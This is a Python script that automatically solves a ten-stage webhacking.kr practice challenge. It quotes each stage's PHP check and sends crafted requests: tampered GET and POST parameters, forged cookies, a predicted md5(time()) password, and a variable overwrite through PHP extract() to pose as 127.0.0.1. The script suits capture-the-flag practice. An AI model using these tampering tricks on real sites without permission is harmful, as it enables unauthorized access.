import requests
from bs4 import BeautifulSoup
import hashlib
import time

url = 'https://webhacking.kr/challenge/bonus-6/'
cookies = {
    'PHPSEESID' : 'your_phpsessid'
}

def get_next_level(html):
    soup = BeautifulSoup(html, 'html.parser')
    a = soup.find_all('a')
    for href in a:
        get = href.get('href')
        if 'php' in get:
            return get

def get_ip_address():
    get_ip_address_web = 'https://www.whatismyip.com'
    request = requests.get(get_ip_address_web)
    soup = BeautifulSoup(request.text, 'html.parser')
    span = soup.find_all('span')
    for item in span:
        get = item.get_text()
        if 'Your IP:' in get:
            ip  = ''.join([x for x in get if x.isdigit() or x == '.'])
            return ip

def hash_time():
    m = hashlib.md5()
    data = str(int(time.time())).encode('utf-8')
    m.update(data)
    return m.hexdigest()

def hash(data):
    m = hashlib.md5()
    m.update(data)
    return m.hexdigest()

# 第一題 
# if($_GET['get']=="hehe") echo "<a href=???>Next</a>";
next = requests.get(url + '?get=hehe', cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第二題 
# if($_POST['post']=="hehe" && $_POST['post2']=="hehe2") echo "<a href=???>Next</a>";
data = {
    'post' : 'hehe',
    'post2' : 'hehe2'
}
next = requests.post(url + next_level, cookies=cookies, data=data)
next_level = get_next_level(next.text)
print(next_level)

# 第三題 
# if($_GET['myip'] == $_SERVER['REMOTE_ADDR']) echo "<a href=???>Next</a>";
next = requests.get(url + next_level + '?myip=' + get_ip_address(), cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第四題 
# if($_GET['password'] == md5(time())) echo "<a href=???>Next</a>";
next = requests.get(url + next_level + '?password=' + hash_time(), cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第五題 
# if($_GET['imget'] && $_POST['impost'] && $_COOKIE['imcookie']) echo "<a href=???>Next</a>";
data = {
    'impost' : '1'
}
cookies['imcookie'] = '1'
next = requests.post(url + next_level + '?imget=1', data=data, cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第六題 
# if($_COOKIE['test'] == md5($_SERVER['REMOTE_ADDR']) && $_POST['kk'] == md5($_SERVER['HTTP_USER_AGENT'])) echo "<a href=???>Next</a>";
headers = {
    'User-Agent' : 'whatever you like'
}
cookies['test'] = hash(get_ip_address().encode('utf-8'))
data = {
    'kk' : hash(headers['User-Agent'].encode('utf-8'))
}
next = requests.post(url + next_level, headers=headers, data=data, cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第七題 
# $_SERVER['REMOTE_ADDR'] = str_replace(".","",$_SERVER['REMOTE_ADDR']);
# if($_GET[$_SERVER['REMOTE_ADDR']] == $_SERVER['REMOTE_ADDR']) echo "<a href=???>Next</a>";
next = requests.get(url + next_level + '?' + get_ip_address().replace('.', '') + '=' + get_ip_address().replace('.', ''), cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第八題 
# extract($_GET);
# if(!$_GET['addr']) $addr = $_SERVER['REMOTE_ADDR'];
# if($addr == "127.0.0.1") echo "<a href=???>Next</a>";
next = requests.get(url + next_level + '?addr=127.0.0.1', cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第九題 
# for($i=97;$i<=122;$i=$i+2){
#   $answer.=chr($i);
# }
# if($_GET['ans'] == $answer) echo "<a href=???.php>Next</a>";
answer = ''
for i in range(97, 123, 2):
    answer += chr(i)
next = requests.get(url + next_level + '?ans=' + answer, cookies=cookies)
next_level = get_next_level(next.text)
print(next_level)

# 第十題
# $ip = $_SERVER['REMOTE_ADDR'];
# for($i=0;$i<=strlen($ip);$i++) $ip=str_replace($i,ord($i),$ip);
# $ip=str_replace(".","",$ip);
# $ip=substr($ip,0,10);
# $answer = $ip*2;
# $answer = $ip/2;
# $answer = str_replace(".","",$answer);
# $f=fopen("answerip/{$answer}_{$ip}.php","w");
# fwrite($f,"<?php include \"../../../config.php\"; solve(33); unlink(__FILE__); ?>");
ip = get_ip_address()
i = 0
while (i <= len(ip)):
    i_str = str(i)
    if len(i_str) > 1:
        i_str = i_str[0]
    ip = ip.replace(str(i), str(ord(i_str)))
    i += 1
ip = ip.replace('.', '')
ip = ip[:10]
answer = int(ip) * 2
answer = int(ip) / 2
answer = str(answer).replace('.', '')
next = requests.get(url + 'answerip/' + answer + '_' + ip + '.php', cookies=cookies)
print(next.text)
